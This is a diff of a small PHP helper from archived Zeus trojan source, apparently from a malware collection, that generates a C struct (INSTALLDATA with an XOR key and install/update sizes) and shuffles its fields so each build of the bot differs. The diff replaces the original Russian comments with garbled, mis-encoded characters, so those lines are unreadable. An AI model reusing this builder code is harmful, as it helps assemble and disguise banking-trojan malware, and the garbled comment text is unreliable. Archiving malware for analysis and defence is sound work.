@@ -1,29 +1,40 @@
+/*
+  name      Zeus
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 <?php
 ///////////////////////////////////////////////////////////////////////////////////////////////////
-// Генерация структуры INSTALLDATA.
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ INSTALLDATA.
 ///////////////////////////////////////////////////////////////////////////////////////////////////  
 
 /*  
-  Генерация структуры BASECONFIG.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ BASECONFIG.
 
-  Return - содержимое h-файла.
+  Return - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ h-пїЅпїЅпїЅпїЅпїЅ.
 */
 function generateInstallData()
 {
   $vars = array
   (
-    "DWORD xorKey;      //Ключ шифрования.",
-    "DWORD installSize; //Размер CoreInstall::_install().",
-    "DWORD updateSize;  //Размер CoreInstall::_update()."
+    "DWORD xorKey;      //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.",
+    "DWORD installSize; //пїЅпїЅпїЅпїЅпїЅпїЅ CoreInstall::_install().",
+    "DWORD updateSize;  //пїЅпїЅпїЅпїЅпїЅпїЅ CoreInstall::_update()."
   );
 
-  //Перемешиваем значения.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   shuffle($vars);
 
-  //Добовляем перед каждым значением структуры, произволный буффер.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
   $outputStruct = implode("\r\n  ", $vars);
 
-  //Выводим.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   return "typedef struct\r\n{\r\n  {$outputStruct}\r\n}INSTALLDATA;\r\n";
 }
 ?>
